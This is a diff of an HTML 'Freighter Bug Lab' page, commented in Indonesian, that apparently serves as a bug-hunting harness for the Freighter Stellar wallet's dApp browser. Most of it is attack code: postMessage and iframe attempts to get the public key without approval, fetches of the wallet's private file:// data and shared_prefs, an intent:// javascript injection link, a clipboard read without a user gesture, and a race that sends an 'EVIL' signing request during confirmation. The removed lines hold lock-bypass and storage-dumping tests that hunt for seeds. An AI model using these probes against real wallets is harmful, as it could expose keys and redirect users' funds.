@@ -1,125 +1,130 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Freighter Security Lab</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Freighter Dapp Browser Lab</title>
 <style>
-body{font-family:monospace;padding:16px;background:#111;color:#0f0}
-button{padding:12px;width:100%;margin:8px 0;background:#222;color:#0f0;border:1px solid #0f0}
-.card{border:1px solid #333;padding:12px;margin:12px 0}
-.warn{color:#f55}
+body{background:#0a0a0a;color:#00ff88;font-family:monospace;padding:15px}
+h2{border-bottom:1px solid #333;padding-bottom:5px}
+button{width:100%;padding:14px;margin:6px 0;background:#111;color:#0f8;border:1px solid #0f8;font-weight:bold}
+a{color:#5af;display:block;margin:6px 0;word-break:break-all}
+.card{border:1px solid #222;padding:12px;margin:15px 0;background:#111}
+.log{background:#000;padding:8px;min-height:20px;white-space:pre-wrap;font-size:12px}
+.red{color:#ff4444}
 </style>
 </head>
 <body>
-<h2>Freighter Bug Lab</h2>
+<h1>Freighter Bug Lab - All in One</h1>
 
 <div class="card">
-<h3>TEST 1: Destination Swap Mid-Confirm (Clipboard/NFC/URI)</h3>
-<p>Ini ngetest bug: Pas popup confirm muncul, dapp coba ganti XDR.</p>
-<p>Tujuan awal: GAAA...GOOD<br>Tujuan jahat: GAAA...EVIL</p>
-<button onclick="testSwap()">1. Kirim Tx Jujur -> Coba Swap Pas Confirm</button>
-<p id="log1"></p>
+<h2>1. postMessage Bridge Test</h2>
+<button onclick="testPostMessage()">Test postMessage Hijack</button>
+<div id="log1" class="log"></div>
 </div>
 
 <div class="card">
-<h3>TEST 2: Lock Timing Bypass (Wall Clock)</h3>
-<p>Set auto-lock Freighter 1 menit. Klik tombol, minimize app 1 menit+. Kalau dia pakai wall-clock, ganti jam HP maju 2 jam bakal ke-unlock.</p>
-<button onclick="testLock()">2. Start Timer Lock Test</button>
-<p id="log2"></p>
+<h2>2. Iframe Permission Test</h2>
+<p>Parent sudah connect, apakah child (evil) auto connect?</p>
+<iframe id="evilFrame" srcdoc="
+  <script>
+    setTimeout(()=>{
+      try{
+        parent.postMessage('try get key from iframe','*');
+        window.freighterApi.getPublicKey().then(k=>parent.postMessage('IFRAME BUG GOT KEY:'+k,'*')).catch(e=>parent.postMessage('iframe blocked:'+e,'*'))
+      }catch(e){parent.postMessage('iframe error:'+e,'*')}
+    },1000)
+  </script>
+" style="width:100%;height:80px;background:#222"></iframe>
+<button onclick="document.getElementById('log2').innerText='Check log di bawah, kalau iframe bisa getPublicKey tanpa approve = BUG'">Cek Iframe Log</button>
+<div id="log2" class="log"></div>
 </div>
 
 <div class="card">
-<h3>TEST 3: Keystore / Storage Race</h3>
-<p>Ini gak bisa 100% dari HTML, tapi kita test apakah Freighter nyimpen secret di localStorage/session yang bisa ke-baca dapp.</p>
-<button onclick="testStorage()">3. Cek Storage Leak</button>
-<p id="log3"></p>
+<h2>3. File / Content Scheme Test</h2>
+<a href="file:///data/data/org.stellar.freighter/files/">file:///data/data/org.stellar.freighter/files/</a>
+<a href="file:///data/data/org.stellar.freighter/shared_prefs/">file:///shared_prefs/</a>
+<a href="content://media/external/">content://media/external/</a>
+<button onclick="testFile()">Test fetch file:// via JS</button>
+<div id="log3" class="log"></div>
+</div>
+
+<div class="card">
+<h2>4. Intent / Scheme Bypass</h2>
+<a href="intent://#Intent;scheme=javascript;S.code=alert(document.domain);end">Intent javascript:alert</a>
+<a href="freighter://sign?xdr=AAAA...">freighter:// scheme</a>
+<a href="stellar://pay?destination=EVIL&amount=100">stellar:// scheme</a>
+</div>
+
+<div class="card">
+<h2>5. Clipboard Read Test</h2>
+<button onclick="testClipboard()">Coba baca clipboard tanpa gesture</button>
+<div id="log5" class="log"></div>
+</div>
+
+<div class="card">
+<h2>6. Destination Swap Race</h2>
+<button onclick="testSwapRace()">Test Swap Pas Confirm</button>
+<div id="log6" class="log"></div>
 </div>
 
 <script>
-// GANTI JADI ALAMAT LU SENDIRI BUAT TEST
-const GOOD_ADDR = "GCDNJUBQSX2RBI5P6J6H4Q7P5S4A3A2A1A0A9A8A7A6A5A4A3A2A1A0A9A";
-const EVIL_ADDR = "GBADBADBADBADBADBADBADBADBADBADBAD";
+window.addEventListener('message', e=>{
+  document.getElementById('log2').innerText += "\n[MSG] "+e.data+" origin:"+e.origin;
+});
 
-// XDR helper - kita pakai Freighter API langsung biar lebih real
-async function testSwap(){
+function testPostMessage(){
   const log = document.getElementById('log1');
-  log.innerText = "Membuat transaksi jujur...";
-  
-  try {
-    if(!window.freighterApi) { log.innerText = "freighterApi tidak ada. Buka di Freighter dApp Browser"; return; }
-
-    const publicKey = await window.freighterApi.getPublicKey();
-    log.innerText = `PublicKey: ${publicKey}\nBuilding Tx ke GOOD...`;
-
-    // Ini transaksi asli yang akan di-preview user
-    // Di real test, lu harus build XDR via @stellar/stellar-sdk
-    // Untuk lab cepat, kita pakai signTransaction dengan XDR dummy yang akan lu ganti
-    const xdrGood = "AAAAAgAAAAD...XDR_KE_GOOD_ADDR..."; // GANTI DENGAN XDR REAL
-
-    // Panggil sign
-    const signed1Promise = window.freighterApi.signTransaction(xdrGood, { networkPassphrase: "Test SDF Network ; September 2015" });
-
-    // INI INTI BUG NYA: 2 detik setelah popup muncul, kita coba swap
-    setTimeout(() => {
-      log.innerText += "\n[ATTACK] 2 detik setelah confirm muncul, mencoba swap XDR ke EVIL...";
-      // Di wallet yang bug, dia akan snapshot ulang atau baca dari variabel global yang bisa kita timpa
-      // Kita coba overwrite
-      window._evilXdr = "AAAAAgAAAAD...XDR_KE_EVIL_ADDR...";
-      // Coba kirim intent baru
-      if(window.location.href.includes("#")){
-         history.replaceState(null, "", window.location.pathname + "#evil-payload");
-      }
-      log.innerText += "\n[ATTACK] Swap attempt dikirim. Cek di Freighter apakah destination masih GOOD atau jadi EVIL?";
-    }, 2000);
-
-    const result = await signed1Promise;
-    log.innerText += "\nSigned Result: " + result;
-
-  } catch(e){
-    log.innerText += "\nError: " + e.message;
-  }
+  log.innerText = "Mengirim postMessage...";
+  window.postMessage({type:"freighter:getPublicKey", method:"getPublicKey"}, "*");
+  window.postMessage({method:"getAddress"}, "*");
+  window.postMessage({action:"sign"}, "*");
+  setTimeout(()=>{ log.innerText += "\nKalau ada balasan key tanpa popup approve = BUG CRITICAL"; }, 2000);
+  window.addEventListener('message', e=>{
+    log.innerText += "\n[RECV] "+JSON.stringify(e.data).slice(0,200);
+  });
 }
 
-async function testLock(){
-  const log = document.getElementById('log2');
-  let sec = 0;
-  log.innerText = "Timer jalan... minimize Freighter sekarang. Auto-lock harusnya 1 menit.";
-  setInterval(()=>{
-    sec++;
-    log.innerText = `Running ${sec}s... Coba ganti jam HP ke +2 jam di menit ke-60. Kalau ke-unlock, bug wall-clock confirmed.`;
-    // Coba panggil API setelah 70 detik, kalau masih bisa tanpa minta PIN = bug
-    if(sec === 70){
-      window.freighterApi.getPublicKey().then(k => {
-        log.innerText += `\n[FAIL/Bug?] Setelah 70s masih bisa getPublicKey tanpa PIN: ${k} -> Lock bypass!`;
-      }).catch(err=>{
-        log.innerText += `\n[OK] Setelah 70s diminta PIN / error: ${err.message} -> Lock aman (monotonic)`;
-      });
-    }
-  }, 1000);
-}
-
-function testStorage(){
+async function testFile(){
   const log = document.getElementById('log3');
-  let out = "";
-  out += "localStorage: " + JSON.stringify(localStorage).slice(0,500) + "\n";
-  out += "sessionStorage: " + JSON.stringify(sessionStorage).slice(0,500) + "\n";
-  out += "Checking indexedDB Freighter...\n";
-  
-  // Coba list semua DB
-  if(window.indexedDB.databases){
-    window.indexedDB.databases().then(dbs=>{
-      out += "DBs found: " + JSON.stringify(dbs) + "\n";
-      out += "Kalau ada DB berisi seed/mnemonic plaintext = CRITICAL BUG";
-      log.innerText = out;
-    });
-  } else {
-    log.innerText = out + "\nDatabases API not available";
+  try{
+    let r = await fetch("file:///data/data/org.stellar.freighter/files/");
+    log.innerText = "FETCH file:// SUCCESS: "+ await r.text().then(t=>t.slice(0,200));
+  }catch(e){
+    log.innerText = "FETCH file:// BLOCKED (GOOD): "+e.message;
   }
-  
-  // Test force close race - instruksi manual
-  out += "\n\n[MANUAL TEST] Untuk Keystore Wipe:\n1. Buat wallet baru\n2. Pas proses tulis seed (backup), langsung force close dari recent apps\n3. Buka lagi, cek apakah seed hilang / jadi wallet kosong. Kalau ya, bug recreate store confirmed.";
-  log.innerText = out;
+}
+
+async function testClipboard(){
+  const log = document.getElementById('log5');
+  try{
+    const text = await navigator.clipboard.readText();
+    log.innerText = "CLIPBOARD READ SUCCESS (BUG): "+text;
+  }catch(e){
+    log.innerText = "CLIPBOARD BLOCKED (GOOD): "+e.message;
+  }
+}
+
+async function testSwapRace(){
+  const log = document.getElementById('log6');
+  log.innerText = "Step 1: Request sign Tx GOOD...\n";
+  if(!window.freighterApi){ log.innerText+="freighterApi gak ada, buka di Freighter"; return; }
+  try{
+    // Ini XDR dummy, ganti pakai XDR testnet lu
+    const xdrGood = "AAAAAgAAA...GOOD...";
+    const promise = window.freighterApi.signTransaction(xdrGood, {network:"TESTNET"});
+    
+    setTimeout(()=>{
+      log.innerText += "[ATTACK] 1 detik setelah popup, coba spam request EVIL...\n";
+      // Coba timpa dengan request baru
+      window.freighterApi.signTransaction("AAAAAgAAA...EVIL...", {network:"TESTNET"}).then(r=>log.innerText+="\nSecond sign got: "+r).catch(e=>{});
+    },1000);
+
+    let res = await promise;
+    log.innerText += "Result: "+res+"\nCek apakah yang ke-sign GOOD atau EVIL";
+  }catch(e){
+    log.innerText += "Error: "+e.message;
+  }
 }
 </script>
 </body>
